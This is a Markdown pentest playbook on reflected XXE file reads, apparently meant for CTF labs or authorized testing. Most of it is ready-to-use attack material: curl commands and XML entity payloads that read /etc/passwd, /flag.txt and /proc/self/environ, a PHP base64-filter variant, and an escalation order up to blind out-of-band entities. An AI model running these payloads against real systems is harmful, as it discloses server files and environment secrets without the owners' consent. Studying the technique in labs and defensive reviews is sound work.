# Reflected XXE File Read

## Context

Use this when an application parses attacker-controlled XML and returns parsed fields such as `title`, `body`, `name`, or `value` in JSON/HTML.

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live secrets, tokens, cookies, flags, or private URLs in reusable files.

## Baseline Parse

```bash
curl -sS -X POST "https://[host]/parse.php" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<doc><title>Hello</title><body>Test</body></doc>"}'
```

Adjust endpoint and wrapper format to match the target.

## Minimal Direct File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<doc>
  <title>&xxe;</title>
  <body>test</body>
</doc>
```

JSON wrapper example:

```bash
curl -sS -X POST "https://[host]/parse.php" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE doc [\n  <!ENTITY xxe SYSTEM \"file:///flag.txt\">\n]>\n<doc>\n  <title>&xxe;</title>\n  <body>test</body>\n</doc>"}'
```

## Useful Target Paths

```text
file:///etc/passwd
file:///flag.txt
file:///proc/self/environ
file:///etc/hosts
```

## PHP Base64 Filter Variant

Use when file contents break XML or output encoding:

```xml
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<doc>
  <title>&xxe;</title>
  <body>test</body>
</doc>
```

Decode the reflected base64 locally.

## Reflection Strategy

Test the entity reference in every field the server returns:

```text
<title>&xxe;</title>
<body>&xxe;</body>
<doc attr="&xxe;">test</doc>
```

Also inspect:

- JSON fields
- HTML output
- parser error messages

## Why This Works

Legacy XML parsers may resolve DTD `SYSTEM` identifiers during parse. Referencing `&xxe;` substitutes the resolved content into the document before the application extracts reflected fields.

## Common Mistakes

- Starting with blind/OOB XXE before testing direct reflection.
- Putting the entity only in non-reflected fields.
- Forgetting the target may wrap XML inside JSON rather than accepting raw `application/xml`.
- Assuming frontend HTML escaping means the backend did not already disclose the file in JSON.

## Escalation Order

1. Inline external entity in reflected field
2. Lab-provided path such as `/flag.txt`
3. Base64/filter wrappers
4. Error-based disclosure
5. Blind/OOB parameter entities
